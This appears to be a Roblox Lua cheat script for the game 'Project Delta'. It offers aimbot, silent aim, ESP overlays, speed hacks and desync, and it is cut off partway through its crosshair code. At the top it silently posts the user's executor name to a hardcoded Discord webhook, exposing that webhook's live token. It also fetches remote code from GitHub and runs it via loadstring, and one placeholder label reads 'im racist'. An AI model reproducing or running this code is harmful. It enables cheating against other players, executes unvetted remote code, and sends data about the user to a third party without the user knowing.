repeat wait(.1) until game:IsLoaded()
repeat wait(.1) until game:GetService("Players").LocalPlayer.Character

local url = "https://discord.com/api/webhooks/1330732368880996382/a5DHUuEJQUzVuyyiH2Ftdeci8JL5lWg_XEnhUoOEEd-Bg3yybGKsjAuZ5uInVx0XSLnE"
wait(0.5)
local data = {
    ["content"] = "@everyone",
    ["embeds"] = {
        {
        ["title"] = "**Execution Logs**",
        ["description"] = "Uses :"..identifyexecutor().."",
        ["type"] = "rich",
        ["color"] = tonumber(0xA60842),
        ["footer"] = {
        ["icon_url"] = "https://steamuserimages-a.akamaihd.net/ugc/35562945673976438/8B9CB721CABAE32A5C3804C9B7169D0E0267C80C/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true",
        ["text"] = "Project Delta"
        }
        }
    }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
request = http_request or request or HttpPost 
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

--// Settings
local enables = {
    main = {
        silent = false,
        aimbot = false,
        currentname = nil,
        currenthitpart = "Head",
        fovradius = 0,
        playerinfo = false,
        highlighttarget = false,
        highlightcolor = Color3.fromRGB(255, 255, 255),
        prediction = false,
        bprediction = false
    },
    esp = {
		box = {
			boxtype = {
                enabled = false,
                multiple = "",
                color = Color3.fromRGB(255, 255, 255),
            },
			gradientbox = {
				enabled = false,
				color1 = Color3.fromRGB(255, 255, 255),
				color2 = Color3.fromRGB(255, 255, 255),
			}, 
		},
		infos = {
			name = {
				enabled = false,
				color = Color3.fromRGB(255, 255, 255),
			},
			distance = {
				enabled = false,
				color = Color3.fromRGB(255, 255, 255),
			},
			healthtext = {
				enabled = false,
			},
			weapon = {
				enabled = false,
				color = Color3.fromRGB(255, 255, 255),
			},
			isuser = {
				enabled = false,
				color = Color3.fromRGB(255, 255, 255),
			},
		},
		healthbar = false,
		teamcheck = false,
		distancelimit = 0,
	},
	botesp = {
		-- i will add later.
	},
    misc = {
        bhop = false,
        speed_hack = false,
        amongus = false,
        zoom = false,
        spin = false,
        spin_value = 0,
        water_float = false,
        desync = false
    },
    cursor = {
        Enabled = false,
        CustomPos = false,
        Position = Vector2.new(0, 0),
        Speed = 5,
        Radius = 25,
        Color = Color3.fromRGB(180, 50, 255),
        Thickness = 1.7,
        Outline = false,
        Resize = false,
        Gap = 10,
        TheGap = false,
        Text = {
            Logo = false,
            LogoColor = Color3.new(1, 1, 1),
            Name = false,
            NameColor = Color3.new(1, 1, 1),
            LogoFadingOffset = 0,
        },
    },
 }

 local GunTables = {
    AKM = "AKM",
    AKMN = "AKMN",
    AsVal = "AsVal",
    IZh12 = "IZh12",
    IZh81 = "IZh81",
    M4 = "M4",
    MK23 = "MK23",
    MP443 = "MP443",
    MP5SD = "MP5SD",
    Makarov = "Makarov",
    Mosin = "Mosin",
    PKM = "PKM",
    PPSH41 = "PPSH41",
    R700 = "R700",
    RPG7 = "RPG7",
    SKS = "SKS",
    SVD = "SVD",
    Saiga12 = "Saiga12",
    TFZ0 = "TFZ0",
    TFZ98S = "TFZ98S",
    TT33 = "TT33",
    VZ61 = "VZ61",
 }

 local utility = {}
 local functions = {} -- functions:name() to update or easier to find L
 --// Variables
 local workspace = game.Workspace
 local players = game:GetService("Players")
 local localplayer = players.LocalPlayer
 local mouse = localplayer:GetMouse()
 local dysenc = {}
 local temp = 1
 local camera = workspace.CurrentCamera
 local lighting = game:GetService("Lighting")
 local replicatestorage = game:GetService("ReplicatedStorage")
 local userinput = game:GetService("UserInputService")
 local runservice = game:GetService("RunService")
 local centerofscreen = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
 local os_clock = os.clock()
 local Sky = game:GetService("Lighting"):FindFirstChildOfClass("Sky")
 local realAmmoTypes = replicatestorage:FindFirstChild("realAmmoTypes") or replicatestorage:FindFirstChild("AmmoTypes") and replicatestorage:FindFirstChild("AmmoTypes"):Clone(); if realAmmoTypes then realAmmoTypes.Name = "realAmmoTypes" end
 local ScreenInstance = Instance.new("ScreenGui", game.Workspace) ScreenInstance.Name = "Screengui"

 --// For Desync
 local animation = Instance.new("Animation")
 animation.AnimationId = "http://www.roblox.com/asset/?id=15693621070"
 local danceTrack

 --// Skybox
 if not Sky then Sky = Instance.new("Sky", lighting) end
 local value = "Standard"
 local SkyBoxes = {
     ["Standard"] = { ["SkyboxBk"] = Sky.SkyboxBk, ["SkyboxDn"] = Sky.SkyboxDn, ["SkyboxFt"] = Sky.SkyboxFt, ["SkyboxLf"] = Sky.SkyboxLf, ["SkyboxRt"] = Sky.SkyboxRt, ["SkyboxUp"] = Sky.SkyboxUp, },
     ["Among Us"] = { ["SkyboxBk"] = "rbxassetid://5752463190", ["SkyboxDn"] = "rbxassetid://5752463190", ["SkyboxFt"] = "rbxassetid://5752463190", ["SkyboxLf"] = "rbxassetid://5752463190", ["SkyboxRt"] = "rbxassetid://5752463190", ["SkyboxUp"] = "rbxassetid://5752463190" },
     ["Doge"] = { ["SkyboxBk"] = "rbxassetid://159713165", ["SkyboxDn"] = "rbxassetid://159713165", ["SkyboxFt"] = "rbxassetid://5752463190", ["SkyboxLf"] = "rbxassetid://5752463190", ["SkyboxRt"] = "rbxassetid://159713165", ["SkyboxUp"] = "rbxassetid://159713165" },
     ["Spongebob"] = { ["SkyboxBk"] = "rbxassetid://277099484", ["SkyboxDn"] = "rbxassetid://277099500", ["SkyboxFt"] = "rbxassetid://277099554", ["SkyboxLf"] = "rbxassetid://277099531", ["SkyboxRt"] = "rbxassetid://277099589", ["SkyboxUp"] = "rbxassetid://277101591" },
     ["Deep Space"] = { ["SkyboxBk"] = "rbxassetid://159248188", ["SkyboxDn"] = "rbxassetid://159248183", ["SkyboxFt"] = "rbxassetid://159248187", ["SkyboxLf"] = "rbxassetid://159248173", ["SkyboxRt"] = "rbxassetid://159248192", ["SkyboxUp"] = "rbxassetid://159248176" },
     ["Winter"] = { ["SkyboxBk"] = "rbxassetid://510645155", ["SkyboxDn"] = "rbxassetid://510645130", ["SkyboxFt"] = "rbxassetid://510645179", ["SkyboxLf"] = "rbxassetid://510645117", ["SkyboxRt"] = "rbxassetid://510645146", ["SkyboxUp"] = "rbxassetid://510645195" },
     ["Clouded Sky"] = { ["SkyboxBk"] = "rbxassetid://252760981", ["SkyboxDn"] = "rbxassetid://252763035", ["SkyboxFt"] = "rbxassetid://252761439", ["SkyboxLf"] = "rbxassetid://252760980", ["SkyboxRt"] = "rbxassetid://252760986", ["SkyboxUp"] = "rbxassetid://252762652" },
 }
 --// Drawing
 function utility:new(type, properties)
    local object = Drawing.new(type)

    for i, v in pairs(properties) do
        object[i] = v
    end
    return object
 end

 --// Library Shit
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/BIvck/Skibidi/refs/heads/main/library.lua", true))()
 library.Title = 'anti.<font color="rgb(245, 66, 230)">solutions</font> | <font color="rgb(245, 66, 230)">Project Delta (P)</font>'
 library.Build = 'build: <font color="rgb(245, 66, 230)">freemium</font>'

 --// Tabs
 local tabs = {
    combat = library:addTab("Combat", "http://www.roblox.com/asset/?id=15178561786"),
    visuals = library:addTab("Visuals", "http://www.roblox.com/asset/?id=13321848320"),
    misc = library:addTab("Misc", "http://www.roblox.com/asset/?id=7347408509"),
    settings = library:addTab("Settings", "http://www.roblox.com/asset/?id=11956055886")
 }

 local esp = function(player)
	--// Box Section
	local Box = Instance.new("BillboardGui",ScreenInstance)
	Box.Name = "Box"
	Box.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Box.Active = true
    Box.MaxDistance = enables.esp.distancelimit
	Box.AlwaysOnTop = true
	Box.LightInfluence = 1.000
	Box.Size = UDim2.new(4, 0, 6, 0)

	--// CornerBox 
	local CornerBox = Instance.new("Frame",Box)
	CornerBox.Name = "CornerBox"
	CornerBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CornerBox.BackgroundTransparency = 1.000
	CornerBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
	CornerBox.Size = UDim2.new(1, 0, 1, 0)

	local Left = Instance.new("Frame",CornerBox)
	Left.Name = "Left"
	Left.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Left.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Left.Size = UDim2.new(0, 1, 0.300000012, 0)
	local Right = Instance.new("Frame",CornerBox)
	Right.Name = "Right"
	Right.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Right.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Right.Position = UDim2.new(1, 0, 0, 0)
	Right.Size = UDim2.new(0, -1, 0.300000012, 0)
	local Upleft = Instance.new("Frame",CornerBox)
	Upleft.Name = "Upleft"
	Upleft.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Upleft.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Upleft.Size = UDim2.new(0.300000012, 0, 0, 1)
	local Upright = Instance.new("Frame",CornerBox)
	Upright.Name = "Upright"
	Upright.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Upright.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Upright.Position = UDim2.new(0.699999988, 0, 0, 0)
	Upright.Size = UDim2.new(0.300000012, 0, 0, 1)
	local Downright = Instance.new("Frame",CornerBox)
	Downright.Name = "Downright"
	Downright.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Downright.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Downright.Position = UDim2.new(0.699999988, 0, 0.998000026, 0)
	Downright.Size = UDim2.new(0.300000012, 0, 0, 1)
	local RightRight = Instance.new("Frame",CornerBox)
	RightRight.Name = "RightRight"
	RightRight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	RightRight.BorderColor3 = Color3.fromRGB(0, 0, 0)
	RightRight.Position = UDim2.new(1, 0, 0.699999988, 0)
	RightRight.Size = UDim2.new(0, -1, 0.300000012, 0)
	local LeftLeft = Instance.new("Frame",CornerBox)
	LeftLeft.Name = "LeftLeft"
	LeftLeft.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	LeftLeft.BorderColor3 = Color3.fromRGB(0, 0, 0)
	LeftLeft.Position = UDim2.new(0, 0, 0.699999988, 0)
	LeftLeft.Size = UDim2.new(0, 1, 0.300000012, 0)
	local Downleft = Instance.new("Frame",CornerBox)
	Downleft.Name = "Downleft"
	Downleft.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Downleft.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Downleft.Position = UDim2.new(0, 0, 0.998000026, 0)
	Downleft.Size = UDim2.new(0.300000012, 0, 0, 1)
	--

	--// Fully Boxed
	local Box_2 = Instance.new("Frame",Box)
	Box_2.Name = "Box"
	Box_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Box_2.BackgroundTransparency = 1.000
	Box_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Box_2.Size = UDim2.new(1, 0, 1, 0)
	Box_2.Visible = false

	local Up = Instance.new("Frame",Box_2)
	Up.Name = "Up"
	Up.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Up.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Up.Size = UDim2.new(1, 0, 0, 1)
	local Right_2 = Instance.new("Frame",Box_2)
	Right_2.Name = "Right"
	Right_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Right_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Right_2.Position = UDim2.new(1, 0, 0, 0)
	Right_2.Size = UDim2.new(0, -1, 1, 0)
	local Left_2 = Instance.new("Frame",Box_2)
	Left_2.Name = "Left"
	Left_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Left_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Left_2.Size = UDim2.new(0, 1, 1, 0)
	local Down = Instance.new("Frame",Box_2)
	Down.Name = "Down"
	Down.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Down.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Down.Position = UDim2.new(0, 0, 1, 0)
	Down.Size = UDim2.new(1, 0, 0, -1)
	--

	--// Gradient Section
	local GradientFill = Instance.new("Frame",Box)
	GradientFill.Name = "Gradient Fill"
	GradientFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	GradientFill.BackgroundTransparency = 0.550
	GradientFill.BorderColor3 = Color3.fromRGB(0, 0, 0)
	GradientFill.BorderSizePixel = 0
	GradientFill.Size = UDim2.new(1, 0, 1, 0)

	local UIGradient = Instance.new("UIGradient",GradientFill)
	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 17, 255))}
	--

	--// HealthBar
	local Health = Instance.new("BillboardGui",Box)
	Health.Name = "Health"
	Health.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Health.Active = true
    Health.MaxDistance = enables.esp.distancelimit
	Health.AlwaysOnTop = true
	Health.Size = UDim2.new(4.5, 0, 6, 0)

	local Health_2 = Instance.new("Frame",Health)
	Health_2.Name = "Health"
	Health_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Health_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Health_2.Size = UDim2.new(0.0399999991, 0, 1, 0)
	--

	--// Esp Infos
	local Infos = Instance.new("BillboardGui",Box)
	Infos.Name = "Infos"
	Infos.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Infos.Active = true
	Infos.AlwaysOnTop = true
    Infos.MaxDistance = enables.esp.distancelimit
	Infos.LightInfluence = 1.000
	Infos.Size = UDim2.new(500, 0, 50, 0)
	Infos.StudsOffset = Vector3.new(0, 1, 0)

	local Name = Instance.new("TextLabel",Infos)
	Name.Name = "Name"
	Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Name.BackgroundTransparency = 1.000
	Name.BorderColor3 = Color3.fromRGB(255, 255, 255)
	Name.Position = UDim2.new(0, 0, -0.545000017, 0)
	Name.Size = UDim2.new(1, 0, 1, 0)
	Name.Font = Enum.Font.Code
	Name.LineHeight = 0.000
	Name.Text = "im racist"
	Name.TextColor3 = Color3.fromRGB(255, 255, 255)
	Name.TextSize = 12.000
	Name.TextStrokeTransparency = 0.000
	Name.TextWrapped = true
	Name.TextYAlignment = Enum.TextYAlignment.Bottom

	local Distance = Instance.new("TextLabel",Infos)
	Distance.Name = "Distance"
	Distance.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Distance.BackgroundTransparency = 1.000
	Distance.BorderColor3 = Color3.fromRGB(255, 255, 255)
	Distance.Position = UDim2.new(0, 0, 0.0850000009, 0)
	Distance.Size = UDim2.new(1, 0, 1, 0)
	Distance.Font = Enum.Font.Code
	Distance.LineHeight = 0.000
	Distance.Text = "0 meters"
	Distance.TextColor3 = Color3.fromRGB(255, 255, 255)
	Distance.TextSize = 12.000
	Distance.TextStrokeTransparency = 0.000
	Distance.TextWrapped = true

	local Weapon = Instance.new("TextLabel",Infos)
	Weapon.Name = "Weapon"
	Weapon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Weapon.BackgroundTransparency = 1.000
	Weapon.BorderColor3 = Color3.fromRGB(255, 255, 255)
	Weapon.Position = UDim2.new(0.504299998, 0, -0.0399999991, 0)
	Weapon.Size = UDim2.new(1, 0, 1, 0)
	Weapon.Font = Enum.Font.Code
	Weapon.LineHeight = 0.000
	Weapon.Text = "none"
	Weapon.TextColor3 = Color3.fromRGB(255, 255, 255)
	Weapon.TextSize = 12.000
	Weapon.TextStrokeTransparency = 0.000
	Weapon.TextWrapped = true
	Weapon.TextXAlignment = Enum.TextXAlignment.Left

	local Healthtext = Instance.new("TextLabel",Infos)
	Healthtext.Name = "Healthtext"
	Healthtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Healthtext.BackgroundTransparency = 1.000
	Healthtext.BorderColor3 = Color3.fromRGB(255, 255, 255)
	Healthtext.Position = UDim2.new(-0.504599988, 0, -0.0399999991, 0)
	Healthtext.Size = UDim2.new(1, 0, 1, 0)
	Healthtext.Font = Enum.Font.Code
	Healthtext.LineHeight = 0.000
	Healthtext.Text = "100%"
	Healthtext.TextColor3 = Color3.fromRGB(255, 255, 255)
	Healthtext.TextSize = 12.000
	Healthtext.TextStrokeTransparency = 0.000
	Healthtext.TextWrapped = true
	Healthtext.TextXAlignment = Enum.TextXAlignment.Right

	local isuser = Instance.new("TextLabel",Infos)
	isuser.Name = "isuser"
	isuser.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	isuser.BackgroundTransparency = 1.000
	isuser.BorderColor3 = Color3.fromRGB(255, 255, 255)
	isuser.Position = UDim2.new(0, 0, 0.1, 0)
	isuser.Size = UDim2.new(1, 0, 1, 0)
	isuser.Font = Enum.Font.Code
	isuser.LineHeight = 0.000
	isuser.TextColor3 = Color3.fromRGB(255, 255, 255)
	isuser.TextSize = 12.000
	isuser.TextStrokeTransparency = 0.000
	isuser.TextWrapped = true
	--
    local Connection
    Connection = runservice.RenderStepped:Connect(function()
		if player ~= localplayer and player and player.Character and player.Character.FindFirstChild(player.Character, "HumanoidRootPart") and player.Character.Humanoid.Health > 0 then
				Box.Adornee = player.Character.FindFirstChild(player.Character, "HumanoidRootPart")
				Infos.Adornee = player.Character.FindFirstChild(player.Character, "HumanoidRootPart")
				Health.Adornee = player.Character.FindFirstChild(player.Character, "HumanoidRootPart")
				
				--// Distance Limit
				Health.MaxDistance = enables.esp.distancelimit
				Box.MaxDistance = enables.esp.distancelimit
				Infos.MaxDistance = enables.esp.distancelimit
				
				--// Boxes
				if enables.esp.box.boxtype.enabled == true then
                    if enables.esp.box.boxtype.multiple == "Full" then
                        CornerBox.Visible = false
                        Box_2.Visible = true
                        Up.BackgroundColor3 = enables.esp.box.boxtype.color
                        Right_2.BackgroundColor3 = enables.esp.box.boxtype.color
                        Left_2.BackgroundColor3 = enables.esp.box.boxtype.color
                        Down.BackgroundColor3 = enables.esp.box.boxtype.color                 
                    elseif enables.esp.box.boxtype.multiple == "Corner" then
                        CornerBox.Visible = true
                        Box_2.Visible = false
                        Left.BackgroundColor3 = enables.esp.box.boxtype.color
                        Right.BackgroundColor3 = enables.esp.box.boxtype.color
                        Upleft.BackgroundColor3 = enables.esp.box.boxtype.color
                        Upright.BackgroundColor3 = enables.esp.box.boxtype.color
                        Downright.BackgroundColor3 = enables.esp.box.boxtype.color
                        RightRight.BackgroundColor3 = enables.esp.box.boxtype.color
                        LeftLeft.BackgroundColor3 = enables.esp.box.boxtype.color
                        Downleft.BackgroundColor3 = enables.esp.box.boxtype.color
                    end
				else
					CornerBox.Visible = false
                    Box_2.Visible = false
				end
				--// GradientBox
				if enables.esp.box.gradientbox.enabled == true then
					GradientFill.Visible = true
					UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, enables.esp.box.gradientbox.color1), ColorSequenceKeypoint.new(1.00, enables.esp.box.gradientbox.color2)}
				else
					GradientFill.Visible = false
				end
				
				--// Name
				if enables.esp.infos.name.enabled == true then
					Name.Visible = true
					Name.Text = player.Name
					Name.TextColor3 = enables.esp.infos.name.color
				else
					Name.Visible = false
				end
				
				--// isuser 
				if enables.esp.infos.isuser.enabled == true then
					isuser.Visible = true
                    isuser.TextColor3 = enables.esp.infos.isuser.color
                    isuser.Text = ""
				else
					isuser.Visible = false
				end
				
				--// Weapon
				if enables.esp.infos.weapon.enabled == true then
					Weapon.Visible = true
					if game:GetService("ReplicatedStorage").Players:FindFirstChild(player.Name).Status.GameplayVariables.EquippedTool.Value ~= nil then
                        Weapon.TextColor3 = enables.esp.infos.weapon.color
                        Weapon.Text = tostring(game:GetService("ReplicatedStorage").Players:FindFirstChild(player.Name).Status.GameplayVariables.EquippedTool.Value)
					else
						Weapon.Text = "None"
					end
				else
					Weapon.Visible = false
				end
				
				--// Distance
				if enables.esp.infos.distance.enabled == true then
					Distance.Visible = true
					if localplayer.Character and localplayer.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                        Distance.TextColor3 = enables.esp.infos.distance.color
                        Distance.Text = ""..math.ceil((localplayer.Character:FindFirstChild"HumanoidRootPart".Position - player.Character:FindFirstChild"HumanoidRootPart".Position).magnitude / 3.571).. "m"
					end
				else
					Distance.Visible = false
				end
				
				--// HealthText
				if enables.esp.infos.healthtext.enabled == true then
					if player.Character:FindFirstChild("Humanoid") ~= nil then
						Healthtext.Text = math.floor(player.Character:FindFirstChild"Humanoid".Health).."%"
						Healthtext.Visible = true
						Healthtext.TextColor3 = Color3.fromRGB(255 - 255 / (player.Character.Humanoid["MaxHealth"] / player.Character.Humanoid["Health"]), 255 / (player.Character.Humanoid["MaxHealth"] / player.Character.Humanoid["Health"]), 0)
					end
				else
					Healthtext.Visible = false
				end
				
				--// HealthBar
				if enables.esp.healthbar == true then
					if player.Character:FindFirstChild("Humanoid") ~= nil then
						Health_2.Size = UDim2.new(0.0399999991,0,player.Character:FindFirstChild"Humanoid".Health/player.Character:FindFirstChild"Humanoid".MaxHealth,0)
                        Health_2.BackgroundColor3 = Color3.fromRGB(255 - 255 / (player.Character.Humanoid["MaxHealth"] / player.Character.Humanoid["Health"]), 255 / (player.Character.Humanoid["MaxHealth"] / player.Character.Humanoid["Health"]), 0)
					end
					Health_2.Visible = true
				else
					Health_2.Visible = false
				end

                --// if the the player didn't exist then it will find
                if not (game:GetService("Players"):FindFirstChild(player.Name)) then
					Box:FindFirstChild(player.Name):Destroy()
                    Connection:Disconnect()
					coroutine.yield()
                end
			else
                Health_2.Visible = false
                Healthtext.Visible = false
                Distance.Visible = false
                Weapon.Visible = false
                isuser.Visible = false
                Name.Visible = false
                Box_2.Visible = false
                CornerBox.Visible = false
                GradientFill.Visible = false
			end
		end)
	end
 do
    for i,plr in pairs(players:GetChildren()) do
        if plr ~= localplayer then
            esp(plr)
            library:Notify("player joined: "..plr.Name.." - has added esp", 2)
        end
    end

    players.PlayerAdded:Connect(function(plr)
        esp(plr)
        library:Notify("player joined: "..plr.Name.." - has added esp", 2)
    end)
    players.PlayerRemoving:Connect(function(plr)
        library:Notify("player left: "..plr.Name.." - has removed esp", 2)
    end)
 end
 --// Fov Circle
 local Circle = Drawing.new("Circle")
    Circle.Filled = false
    Circle.Thickness = 1
    Circle.Color = Color3.new(0, 0, 0)
    Circle.Visible = false

 function functions:updateCircle()
    local pos
    if enables.cursor.CustomPos then
        pos = enables.cursor.Position
    else
        pos = Vector2.new(
            game.Players.LocalPlayer:GetMouse().X,
            game.Players.LocalPlayer:GetMouse().Y + game:GetService("GuiService"):GetGuiInset().Y
        )
    end
    Circle.Position = pos
    local fovScalingFactor = 5 * math.tan(math.rad(camera.FieldOfView / 2))
    local radius = fovScalingFactor + enables.main.fovradius
    Circle.Radius = radius
 end

 --// Target Closest
 function functions:TargetPlayer()
    local Target = nil
    local Name = nil
    local Distance = math.huge
    for _, player in ipairs(players:GetPlayers()) do
        if player ~= localplayer and player.Character and player.Character:FindFirstChild("Head") then
            local head = player.Character.Head
            local vector, onScreen = camera:WorldToViewportPoint(head.Position)
            local screenPoint = Vector2.new(vector.X, vector.Y)
            local distance = (screenPoint - camera.ViewportSize/2).Magnitude

            if onScreen and distance < enables.main.fovradius and distance < Distance then
                Distance = distance
                Target = player.Character[enables.main.currenthitpart]
                Name = player
            end
        end
        enables.main.currentname = Name
    end
    return Target
 end
 --// Visible Check!
 function functions:VisibleCheck(target)
    local cameraPos = camera.CFrame.Position
    local targetPos
    if target ~= nil and target.Character ~= nil then
        target = target.Character
        if target:FindFirstChild("Head") then
            local ignoreList = {}
            for _, child in ipairs(target:GetChildren()) do
                if child:IsA("Model") or child:IsA("Hat") or child:IsA("MeshPart") or child.Name == "HeadTopHitBox" or child.Name == "FaceHitBox" then
                    table.insert(ignoreList, child)
                end
            end
            table.insert(ignoreList, game.Players.LocalPlayer.Character)
            targetPos = target.Head.Position

            local start = cameraPos
            local goal = targetPos
            local ray = Ray.new(start, (goal - start).unit * (goal - start).magnitude)
            local hit = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
            if hit then
                return false
            else
                return true
            end
        else
            return false
        end
    else
        return false
    end
 end

 local function castgun()
    if not localplayer.Character or not workspace.CurrentCamera:FindFirstChild("ViewModel") then return (camera.ViewportSize / 2) end
    if not workspace.Camera:FindFirstChild("ViewModel"):FindFirstChild("AimPart") then return (camera.ViewportSize / 2) end
    local from = workspace.Camera.ViewModel:FindFirstChild("AimPart")
    local ray = Ray.new(from.CFrame.p, (from.CFrame.LookVector).Unit * 1000)
    local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {localplayer.Character, camera})

    if part then
        local result = camera:WorldToViewportPoint(position)
        return Vector2.new(result.X, result.Y)
    else
        return (camera.ViewportSize / 2)
    end
end

--// Crosshair
 local lines = {}
-- // Drawings
 local outline = utility:new("Square", {
    Visible = true,
    Size = Vector2.new(4, 4),
    Color = Color3.fromRGB(0, 0, 0),
    Filled = true,
    ZIndex = 1,
    Transparency = 1,
 })
 --// Player Info
 local Target = utility:new("Text", {
    Font = 3,
    Size = 13,
    Color = Color3.new(1, 1, 1),
    Center = true,
    Outline = true,
    Position = Vector2.new(centerofscreen.X, (centerofscreen + Vector2.new(0, 55)).Y)
 })
 local Ad = utility:new("Text", {
    Font = 3,
    Size = 13,
    Color = Color3.new(0.952941, 0.356863, 0.874510),
    Transparency = 1,
    Text = "anti.solutions",
    Center = true,
    Outline = true,
    Position = Vector2.new(centerofscreen.X, (centerofscreen + Vector2.new(0, 40)).Y)

 })
 local Health = utility:new("Text", {
    Font = 3,
    Size = 13,
    Color = Color3.fromRGB(52, 235, 70),
    Center = true,
    Outline = true,
    Position = Vector2.new(centerofscreen.X, (centerofscreen + Vector2.new(0, 70)).Y)
 })
 local Meters = utility:new("Text", {
    Font = 3,
    Size = 13,
    Color = Color3.new(1, 1, 1),
    Center = true,
    Outline = true,
    Position = Vector2.new(centerofscreen.X, (centerofscreen + Vector2.new(0, 85)).Y)
 })
 local Visible = utility:new("Text", {
    Font = 3,
    Size = 13,
    Color = Color3.fromRGB(240, 142, 214),
    Center = true,
    Outline = true,
    Text = "Not Visible",
    Position = Vector2.new(centerofscreen.X, (centerofscreen + Vector2.new(0, 100)).Y)
 })
--
for i = 1, 4 do
    local line = utility:new("Line", {
        Visible = true,
        From = Vector2.new(200, 500),
        To = Vector2.new(200, 500),
        Color = enables.cursor.Color,
        Thickness = enables.cursor.Thickness,
        ZIndex = 2,
        Transparency = 1,
    })
    --
    local line_outline = utility:new("Line", {
        Visible = true,
        From = Vector2.new(200, 500),
        To = Vector2.new(200, 500),
        Color = Color3.fromRGB(0, 0, 0),
        Thickness = enables.cursor.Thickness + 2.5,
        ZIndex = 1,
        Transparency = 1,
    })
    --
    lines[i] = { line, line_outline }
end
-- // Main
local angle = 0
local transp = 0
local reverse = false
local function setreverse(value)
    if reverse ~= value then
        reverse = value
    end
end
--
game:GetService("RunService").RenderStepped:connect(function()
    if enables.cursor.Enabled then
        local pos
        if enables.cursor.CustomPos then
            pos = enables.cursor.Position
        else
            pos = Vector2.new(
                game.Players.LocalPlayer:GetMouse().X,
                game.Players.LocalPlayer:GetMouse().Y + game:GetService("GuiService"):GetGuiInset().Y
            )
        end
        angle = angle + (1 / (enables.cursor.Speed * 10))
        if transp <= 1.5 + enables.cursor.Text.LogoFadingOffset and not reverse then
            transp = transp + (1 / (enables.cursor.Speed * 10))
            if transp >= 1.5 + enables.cursor.Text.LogoFadingOffset then
                setreverse(true)
            end
        elseif reverse then
            transp = transp - (1 / (enables.cursor.Speed * 10))
            if transp <= 0 - enables.cursor.Text.LogoFadingOffset then
                setreverse(false)
            end
        end
        if angle >= 360 then
            angle = 0
        end
        --
        Ad.Position = Vector2.new(pos.X, (pos + Vector2.new(0, enables.cursor.Radius + 5)).Y)
        Ad.Transparency = transp
        Target.Position = Vector2.new(pos.X, (pos + Vector2.new(0, enables.cursor.Radius + 20)).Y)
        Health.Position = Vector2.new(pos.X, (pos + Vector2.new(0, enables.cursor.Radius + 35)).Y)
        Meters.Position = Vector2.new(pos.X, (pos + Vector2.new(0, enables.cursor.Radius + 50)).Y)
        Visible.Position = Vector2.new(pos.X, (pos + Vector2.new(0, enables.cursor.Radius + 65)).Y)
        --
        for index, line in pairs(lines) do
            index = index
            if enables.cursor.Resize then
                x = {
                    pos.X
                        + (
                            math.cos(angle + (index * (math.pi / 2)))
                            * (enables.cursor.Radius + ((enables.cursor.Radius * math.sin(angle)) / 9))
                        ),
                    pos.X
                        + (
                            math.cos(angle + (index * (math.pi / 2)))
                            * (
                                (enables.cursor.Radius - 20)
                                - (
                                    enables.cursor.TheGap
                                        and (((enables.cursor.Radius - 20) * math.cos(angle)) / 4)
                                    or (((enables.cursor.Radius - 20) * math.cos(angle)) - 4)
                                )
                            )
                        ),
                }
                y = {
                    pos.Y
                        + (
                            math.sin(angle + (index * (math.pi / 2)))
                            * (enables.cursor.Radius + ((enables.cursor.Radius * math.sin(angle)) / 9))
                        ),
                    pos.Y
                        + (
                            math.sin(angle + (index * (math.pi / 2)))
                            * (
                                (enables.cursor.Radius - 20)
                                - (
                                    enables.cursor.TheGap
                                        and (((enables.cursor.Radius - 20) * math.cos(angle)) / 4)
                                    or (((enables.cursor.Radius - 20) * math.cos(angle)) - 4)
                                )
                            )
                        ),
                }
            else
                x = {
                    pos.X + (math.cos(angle + (index * (math.pi / 2))) * enables.cursor.Radius),
                    pos.X
                        + (
                            math.cos(angle + (index * (math.pi / 2)))
                            * (
                                (enables.cursor.Radius - 20)
                                - (
                                    enables.cursor.TheGap
                                        and ((enables.cursor.Radius - 20) / enables.cursor.Gap)
